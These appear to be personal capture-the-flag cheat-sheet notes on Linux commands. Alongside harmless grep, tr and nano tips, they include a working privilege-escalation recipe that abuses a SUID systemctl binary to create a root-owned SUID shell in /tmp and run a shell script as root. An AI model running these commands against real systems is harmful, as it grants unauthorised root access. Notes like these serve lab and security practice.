# Linux Enumeration Tips


## /bin/systemctl
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chown root:root /tmp/sh; chmod u+s /tmp/sh"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "python /tmp/shell.py"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

## Grep all file for string
```
grep -ilR "flag11" / 2>/dev/null
```

## Remove all newline space from file 
```
tr -d "\n\r" < yourfile.txt
```

## Remove specific character or space from Nano
```
ctrl + \
search the file _char
replace the file _char
choose option
```